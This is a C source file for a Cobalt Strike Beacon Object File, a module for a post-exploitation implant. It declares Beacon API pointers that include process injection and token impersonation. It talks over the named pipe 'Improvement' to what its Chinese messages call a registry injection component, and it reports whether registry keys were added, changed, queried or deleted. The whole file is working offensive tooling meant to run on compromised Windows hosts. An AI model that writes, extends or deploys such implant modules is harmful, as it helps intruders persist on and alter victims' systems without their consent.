#include <windows.h>
#include "beacon.h"

void(*PBeaconDataParse)(datap * parser, char * buffer, int size) = BeaconDataParse;
int(*PBeaconDataInt)(datap * parser) = BeaconDataInt;
short(*PBeaconDataShort)(datap * parser) = BeaconDataShort;
int(*PBeaconDataLength)(datap * parser) = BeaconDataLength;
char*(*PBeaconDataExtract)(datap * parser, int * size) = BeaconDataExtract;
void(*PBeaconFormatAlloc)(formatp * format, int maxsz) = BeaconFormatAlloc;
void(*PBeaconFormatReset)(formatp * format) = BeaconFormatReset;
void(*PBeaconFormatFree)(formatp * format) = BeaconFormatFree;
void(*PBeaconFormatAppend)(formatp * format, char * text, int len) = BeaconFormatAppend;
void(*PBeaconFormatPrintf)(formatp * format, char * fmt, ...) = BeaconFormatPrintf;
char*(*PBeaconFormatToString)(formatp * format, int * size) = BeaconFormatToString;
void(*PBeaconFormatInt)(formatp * format, int value) = BeaconFormatInt;
void(*PBeaconPrintf)(int type, char * fmt, ...) = BeaconPrintf;
void(*PBeaconOutput)(int type, char * data, int len) = BeaconOutput;
BOOL(*PBeaconUseToken)(HANDLE token) = BeaconUseToken;
void(*PBeaconRevertToken)() = BeaconRevertToken;
BOOL(*PBeaconIsAdmin)() = BeaconIsAdmin;
void(*PBeaconGetSpawnTo)(BOOL x86, char * buffer, int length) = BeaconGetSpawnTo;
void(*PBeaconInjectProcess)(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len) = BeaconInjectProcess;
void(*PBeaconInjectTemporaryProcess)(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len) = BeaconInjectTemporaryProcess;
void(*PBeaconCleanupProcess)(PROCESS_INFORMATION * pInfo) = BeaconCleanupProcess;
BOOL(*PtoWideChar)(char * src, wchar_t * dst, int max) = toWideChar;

#define BUFSIZE 4096
void parseResponse(char* reply);

void *myMemcpy(void *dest, const void *src, size_t n) {
	char *pDest = (char*)dest;
	const char *pSrc = (const char*)src;
	for (size_t i = 0; i < n; ++i) {
		*pDest++ = *pSrc++;
	}
	return dest;
}

void splitParam(char* param, char* params[])
{
	int length = strlen((char*)param);

	for (int i = 0, j = 0, index = 0; i < length; i++)
	{
		if (param[i] == ';' && param[i + 1] == ';')
		{
			params[j] = (char*)HeapAlloc(GetProcessHeap(), 0, 0x1000);
			myMemcpy(params[j], (param + index), i - index);
			params[j][i - index] = '\x0';
			index = i + 2;
			j++;
			i++;
		}
	}
}

int begin(char* param)
{
	HANDLE hPipe = NULL;
	DWORD dwReturn = 0;
	LPCTSTR lpszPipename = TEXT("\\\\.\\pipe\\Improvement");

	// 判断是否有可以利用的命名管道
	if (!WaitNamedPipe(lpszPipename, NMPWAIT_USE_DEFAULT_WAIT))
	{
		PBeaconPrintf(CALLBACK_ERROR, "未启动注册表注入功能");
		return 0;
	}
	
	// 打开可用的命名管道 , 并与服务器端进程进行通信  
	hPipe = CreateFile(lpszPipename, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, 0, NULL);

	if (hPipe == INVALID_HANDLE_VALUE)
	{
		PBeaconPrintf(CALLBACK_ERROR, "Open Read Pipe Error");
		return 0;
	}
	
	HANDLE hHeap = GetProcessHeap();
	TCHAR* pchRequest = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE * sizeof(TCHAR));
	TCHAR* pchReply = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE * sizeof(TCHAR));
	DWORD cbBytesRead = 0, cbRequestBytes = 0, cbWritten = 0;
	BOOL fSuccess = FALSE;

	cbRequestBytes = (lstrlen(param) + 1) * sizeof(TCHAR);

	// Write the reply to the pipe. 
	fSuccess = WriteFile(
		hPipe,        // handle to pipe 
		param,     // buffer to write from 
		cbRequestBytes, // number of bytes to write 
		&cbWritten,   // number of bytes written 
		NULL);        // not overlapped I/O 

	if (!fSuccess || cbRequestBytes != cbWritten)
	{
		PBeaconPrintf(CALLBACK_ERROR, "WriteFile Error");
	}
	
	// Read client requests from the pipe. This simplistic code only allows messages
	// up to BUFSIZE characters in length.
	fSuccess = ReadFile(
		hPipe,        // handle to pipe 
		pchReply,    // buffer to receive data 
		BUFSIZE * sizeof(TCHAR), // size of buffer 
		&cbBytesRead, // number of bytes read 
		NULL);        // not overlapped I/O 

	if (!fSuccess || cbBytesRead == 0)
	{
		PBeaconPrintf(CALLBACK_ERROR, "ReadFile Error");
	}
	
	parseResponse(pchReply);
	
	CloseHandle(hPipe);

	HeapFree(hHeap, 0, pchRequest);
	HeapFree(hHeap, 0, pchReply);

	return 0;
}

int myAtoi(char* str) {
	int num = 0;
	int sign = 1;
	char* p = str;

	// 处理字符串前面的空格
	while (*p == ' ') {
		p++;
	}

	// 处理正负号
	if (*p == '+') {
		p++;
	}
	else if (*p == '-') {
		sign = -1;
		p++;
	}

	// 处理数字字符
	while (*p >= '0' && *p <= '9') {
		num = num * 10 + (*p - '0');
		p++;
	}

	return num * sign;
}

void parseResponse(char* reply)
{
	char* replys[3];
	splitParam((char*)reply, replys);

	int operand = myAtoi(replys[0]);
	BOOL isSuccess = replys[1][0] - '0';
	char* result[] = {"失败", "成功"};

	if (operand == 0 || operand == 3 || operand == 6)
	{
		PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值添加%s", result[isSuccess]);
	}
	else if (operand == 1 || operand == 4 || operand == 7)
	{
		PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值修改%s", result[isSuccess]);
	}
	else if (operand == 2 || operand == 5 || operand == 8)
	{
		if (isSuccess)
			PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值查询%s, 查询的值为:%s", result[isSuccess], replys[2]);
		else
			PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值查询%s, 键不存在", result[isSuccess]);
	}
	else if (operand == 9 || operand == 10)
	{
		PBeaconPrintf(CALLBACK_OUTPUT, "注册表键值删除%s", result[isSuccess]);
	}
	else
	{
		PBeaconPrintf(CALLBACK_OUTPUT, "注册表不支持当前操作数");
	}
}

void strat(LPVOID param)
{
	begin(param);
}